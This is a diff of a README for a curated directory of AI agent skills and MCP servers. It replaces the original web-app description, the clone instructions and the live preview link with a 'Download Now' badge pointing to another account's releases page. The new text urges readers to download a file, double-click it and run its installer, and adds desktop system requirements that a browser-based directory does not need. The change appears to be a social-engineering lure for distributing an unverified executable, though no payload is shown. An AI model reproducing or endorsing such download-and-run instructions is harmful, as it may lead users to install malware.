@@ -1,101 +1,70 @@
-# 🧭 Awesome Agent Skills
+# 🧭 Awesome-Agent-Skills - Navigate AI Skills Effortlessly
 
-<div align="center">
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/megalor1/Awesome-Agent-Skills/releases)
 
-![Awesome Agent Skills Banner](https://img.shields.io/badge/Awesome-Agent_Skills-8b5cf6?style=for-the-badge&logo=anthropic&logoColor=white)
+## 📖 Description
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-20232A?style=flat&logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-646CFF?style=flat&logo=vite&logoColor=white)](https://vitejs.dev/)
-[![MCP Ready](https://img.shields.io/badge/MCP-Ready-22c55e)](https://modelcontextprotocol.io/)
+Awesome-Agent-Skills is a curated navigation station for AI Agent skills and MCP servers. This platform helps you discover and utilize various AI skills effectively. Whether you're working with Claude, exploring MCP servers, or diving into OpenAI projects, this tool simplifies your navigation.
 
-**A curated navigation station for AI Agent Skills (Claude, OpenAI) & MCP Servers.**
+## 🚀 Getting Started
 
-[Preview Live](https://awesome-agent-skills.vercel.app/) · [Submit Skill](../../issues/new?template=submit-skill.yml) · [IDE Setup Guide](./IDE_SETUP.md) · [简体中文](./README_ZH.md)
+Follow these steps to get started with Awesome-Agent-Skills:
 
-</div>
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/megalor1/Awesome-Agent-Skills/releases) to find the latest version.
 
----
+2. **Choose Your File**  
+   Look for the latest release. You will see different files available for download. Select the one that suits your system.
 
-## 📖 Introduction
+3. **Download the File**  
+   Click on the file name to start the download. The file will save to your computer.
 
-**Awesome Agent Skills** is a curated navigation station designed for AI Agent developers and power users. With the release of the [Model Context Protocol (MCP)](https://modelcontextprotocol.io/), the capabilities of Agents have been expanded indefinitely. This project aims to organize and classify the most practical Agent skills to help you quickly arm your AI assistant.
+4. **Open the File**  
+   Once the download is complete, locate the file in your downloads folder. Double-click to open it.
 
-Whether you use **Claude Desktop**, **Cursor**, **Windsurf**, or **Antigravity**, you can find the right tools here.
+5. **Follow the On-screen Instructions**  
+   The application will guide you through the setup process. Follow the prompts to complete the installation.
 
-## ✨ Features
+## 💻 System Requirements
 
-- **🧩 MCP Servers Collection**: Includes official and community high-quality MCP services like GitHub, Filesystem, PostgreSQL, etc.
-- **🎯 Rich Agent Skills**: Covers Prompt-based skills such as TDD, System Design, Creative Writing, Code Audit, etc.
-- **🌗 Ultimate UI Experience**:
-    - **Light Mode**: "Ceramic Clean" style, ceramic white background with semi-transparent frosted glass texture.
-    - **Dark Mode**: Modern dark dashboard style, focused on developer experience.
-- **⚡️ Real-time Search**: Supports millisecond-level filtering by keywords, tags, and sources (Anthropic, Community, OpenAI).
-- **📱 Responsive Bento Layout**: Perfectly adapted for both desktop and mobile access.
+To run Awesome-Agent-Skills smoothly, ensure your system meets the following requirements:
 
-## 🛠️ Usage
+- **Operating System**: Windows 10 or later, or macOS Catalina or later
+- **RAM**: At least 4 GB (8 GB recommended for optimal performance)
+- **Processor**: Multi-core processor with 1 GHz or faster
+- **Storage**: Minimum of 100 MB of available disk space
 
-We have prepared detailed configuration tutorials for different development environments:
+## 📥 Download & Install
 
-👉 **[IDE Setup Guide](./IDE_SETUP.md)**
+To enjoy the features of Awesome-Agent-Skills, visit the [Releases page](https://github.com/megalor1/Awesome-Agent-Skills/releases) to download the latest version. 
 
-Covers configuration methods for the following environments:
-- **Claude Desktop** (Official Client)
-- **Cursor** (AI Code Editor)
-- **Windsurf** (Cascade Engine)
-- **VS Code** (with Cline extension)
-- **Antigravity** (Google Agent)
+Follow the steps above to install the application. Make sure to always check for updates on the Releases page regularly for new features and improvements.
 
-## 📦 Tech Stack
+## 🌟 Features
 
-- **Frontend**: React 18, TypeScript, Vite
-- **Styling**: Vanilla CSS (CSS Variables, Glassmorphism)
-- **Icons**: Lucide React
-- **Deployment**: Vercel / Netlify
+Awesome-Agent-Skills offers several features to enhance your experience:
 
-## 🚀 Development
+- **Easy Navigation**: Quickly find and access AI skills and MCP servers.
+- **User-Friendly Interface**: Designed for easy use, regardless of skill level.
+- **Regular Updates**: We continuously improve and expand our offerings.
 
-```bash
-# 1. Clone the project
-git clone https://github.com/7Ese/Awesome-Agent-Skills.git
+## 📜 License
 
-# 2. Enter directory
-cd Awesome-Agent-Skills
-
-# 3. Install dependencies
-npm install
-
-# 4. Start development server
-npm run dev
-```
+This project is licensed under the MIT License. Feel free to use and modify the software as needed, while giving credit to the original creators.
 
 ## 🤝 Contributing
 
-We welcome community contributions! If you find a useful Skill or MCP Server, please:
+We welcome contributions from everyone. If you have suggestions or find issues, please consider sharing them. 
 
-1.  **Submit Issue**: Use our [Skill Submission Template](../../issues/new?template=submit-skill.yml).
-2.  **Submit PR**:
-    - Fork this repository
-    - Modify `src/data/skills.ts`
-    - Submit a Pull Request
+1. **Fork the repository** to create your own copy.
+2. **Make changes** to the code or documentation.
+3. **Submit a pull request** to propose your changes.
 
-### Data Structure Example
+## 🔗 Connect with Us
 
-```typescript
-{
-  id: 'skill-id',
-  name: 'Skill Name',
-  description: 'A brief description of what this skill does.',
-  category: 'development', // development | research | data | creative ...
-  source: 'community',     // anthropic | openai | huggingface | community
-  tags: ['Tag1', 'Tag2'],
-  repoUrl: 'https://github.com/username/repo',
-  stars: 120,              // GitHub Stars
-  featured: false          // Recommended or not
-}
-```
+If you have questions or need assistance, feel free to reach out via the following channels:
 
-## 📄 License
-
-This project is licensed under the [MIT License](./LICENSE).
+- Open an issue on GitHub for technical support.
+- Join our community discussions on social media platforms.
+  
+By following these steps, you will set up Awesome-Agent-Skills in no time and start navigating AI skills seamlessly. Happy exploring!
